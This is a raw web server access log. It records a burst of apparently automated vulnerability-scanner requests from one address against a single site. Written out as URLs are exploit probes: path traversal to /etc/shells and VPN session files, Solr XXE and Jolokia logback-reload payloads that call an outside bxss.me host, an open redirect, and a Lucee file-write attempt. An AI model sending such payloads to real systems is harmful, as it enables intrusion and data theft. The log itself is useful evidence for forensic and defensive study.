27.147.202.214 - - [08/Jul/2021:01:01:45 -0400] "GET /jsp/help-sb-download.jsp?sbFileName=../../../../../etc/shells HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:45 -0400] "GET / HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:42 -0400] "GET /adminer-4.5.0-en.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:46 -0400] "GET / HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:44 -0400] "GET /adminer-4.4.0.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:46 -0400] "GET /system/refinery/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:45 -0400] "GET /adminer-4.6.0-mysql.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:42 -0400] "GET /Adminer.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:43 -0400] "GET /ad.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:50 -0400] "GET /adminer-4.2.5-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:49 -0400] "GET /adminer-4.5.0.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:45 -0400] "POST /auth/requestreset HTTP/1.1" 500 6648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:48 -0400] "GET /adminer-4.6.2-en.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:43 -0400] "GET /adminer-4.2.5.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:48 -0400] "GET /config/ HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:51 -0400] "GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:45 -0400] "GET /adminer-4.3.0.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:47 -0400] "GET /bal HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:46 -0400] "GET /adminer-4.6.1-mysql-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:51 -0400] "POST / HTTP/1.1" 500 6648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:54 -0400] "GET /bitrix_server_test.php HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:43 -0400] "GET /_adminer.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:51 -0400] "GET /adminer-4.3.0-en.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:53 -0400] "GET /adminer-4.2.5-mysql.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:57 -0400] "GET /admin HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:44 -0400] "GET /upload HTTP/1.1" 500 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:04 -0400] "GET /jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/hit4601693237.bxss.me!/logback.xml HTTP/1.1" 301 911 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:49 -0400] "GET /adminer-4.4.0-mysql-en.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - admin [08/Jul/2021:01:01:54 -0400] "POST /mgmt/tm/util/bash HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:42 -0400] "POST / HTTP/1.1" 500 6648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:04 -0400] "GET /adminer-4.6.1.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:48 -0400] "GET /adminer-4.6.2.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:09 -0400] "GET /4400324024 HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:05 -0400] "GET /sitemap.xml HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:02 -0400] "GET /horde/imp/test.php HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:04 -0400] "GET /monitoring HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:09 -0400] "GET / HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:58 -0400] "GET /system/images/W1siZyIsICJjb252ZXJ0IiwgIi1zaXplIDF4MSAtZGVwdGggOCBncmF5Oi9ldGMvc2hlbGxzIiwgIm91dCJdXQ%3d%3d/test.jpeg HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:05 -0400] "GET /.well-known/acme-challenge/<00516941> HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:50 -0400] "GET /robots.txt HTTP/1.1" 500 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:48 -0400] "GET /ad.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:13 -0400] "GET /dashboard.html HTTP/1.1" 301 635 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:51 -0400] "GET /adminer-4.3.1.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:13 -0400] "GET /upstream_conf?upstream=backend HTTP/1.1" 301 667 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:03 -0400] "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:48 -0400] "GET /adminer-4.5.0-mysql.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:12 -0400] "POST /CMSInstall/install.aspx HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:55 -0400] "GET /adminer-4.6.0-mysql-en.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:13 -0400] "GET /owa/auth/y.js HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:12 -0400] "GET /adminer-4.6.1-mysql.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:12 -0400] "GET /adminer-4.3.1-mysql-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:40 -0400] "POST /graphql HTTP/1.1" 500 6648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:39 -0400] "POST /graphql HTTP/1.1" 500 230 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:09 -0400] "GET /api/jsonws/ HTTP/1.1" 500 6575 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:11 -0400] "GET /admin/LiveLogSettingsServlet?Action=read HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:10 -0400] "GET /adminer-4.3.0-mysql-en.php HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:20 -0400] "POST /graphql HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:09 -0400] "GET /adminer-4.5.0-mysql-en.php HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:24 -0400] "GET /sitemap.xml.gz HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:18 -0400] "POST /nagiosql/admin/helpedit.php HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:13 -0400] "GET /nagiosxi/includes/dashlets/rss_dashlet/magpierss/scripts/magpie_debug.php?url=http://example.com/ HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:09 -0400] "GET /adminer-4.3.1-mysql.php HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:42 -0400] "GET /adminer-4.2.5-mysql-en.php HTTP/1.1" 301 6500 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:42 -0400] "GET /adminer.php HTTP/1.1" 301 6485 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:22 -0400] "GET /robots.txt HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:24 -0400] "GET /static\\..\\..\\..\\..\\..\\..\\..\\..\\..\\etc\\shells HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:18 -0400] "GET /adminer-4.6.1.php HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:23 -0400] "GET /adminer-4.2.5-mysql-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:05 -0400] "GET /__debug__/render_panel/?store_id=1 HTTP/1.1" 500 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:59 -0400] "GET /v1/agent/self HTTP/1.1" 500 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:24 -0400] "GET /api/5/nginx HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:58 -0400] "GET /adminer-4.6.2-mysql-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:32 -0400] "GET /api/4/nginx HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:44 -0400] "GET /adminer-4.6.0.php HTTP/1.1" 301 6491 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:01:44 -0400] "GET /adminer-4.6.1-en.php HTTP/1.1" 301 6494 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:34 -0400] "GET /opencms/handleSolrSelect?fq=%7b!xmlparser%20v=%27%3c!DOCTYPE%20a%20SYSTEM%20%22http://hit1374626158.bxss.me/%22%3e%3ca%3e%3c%2fa%3e%27%7d HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:10 -0400] "GET /adminer-4.4.0-en.php HTTP/1.1" 500 7595 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:34 -0400] "GET / HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:28 -0400] "GET /adminer-4.3.1-en.php HTTP/1.1" 500 6303 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:27 -0400] "GET /api/6/nginx HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:20 -0400] "POST /graphql HTTP/1.1" 500 6648 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:40 -0400] "GET /static/../../../../../../../../../../../etc/shells HTTP/1.1" 400 6596 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:40 -0400] "GET /jkstatus;a HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:33 -0400] "GET / HTTP/1.1" 500 6303 "http://referer.hit23662633000f357.group.bxss.me" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:33 -0400] "POST /webtools/control/xmlrpc HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:43 -0400] "GET /opencms/opencms/handleSolrSelect?fq=%7b!xmlparser%20v=%27%3c!DOCTYPE%20a%20SYSTEM%20%22http://hit3649687387.bxss.me/%22%3e%3ca%3e%3c%2fa%3e%27%7d HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:40 -0400] "GET /phpmyadmin/main.php HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:29 -0400] "POST /lucee/admin/imgProcess.cfm?file=/../../../context/luc674841.cfm HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:42 -0400] "GET /v1/agent/self HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:12 -0400] "GET /bitrix/redirect.php?goto=https://www.angelsonhighstreet.com%252F@bxss.me/ HTTP/1.1" 500 7595 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:34 -0400] "POST /CMSPages/Staging/syncserver.asmx HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:44 -0400] "GET /nette.micro?callback=phpinfo&cmd=1 HTTP/1.1" 500 7526 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:33 -0400] "POST /webtools/control/SOAPService HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:47 -0400] "POST /lucee/admin/imgProcess.cfm?file=/../../../context/luc674841.cfm HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:38 -0400] "GET /unauth/php/change_password.php/%22%3E%3Clbcxseprpe%3E HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:35 -0400] "GET / HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:34 -0400] "POST /mifs/.;/services/LogService HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:44 -0400] "GET /adminer-4.6.0.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:42 -0400] "GET /adminer-4.6.2-mysql-en.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
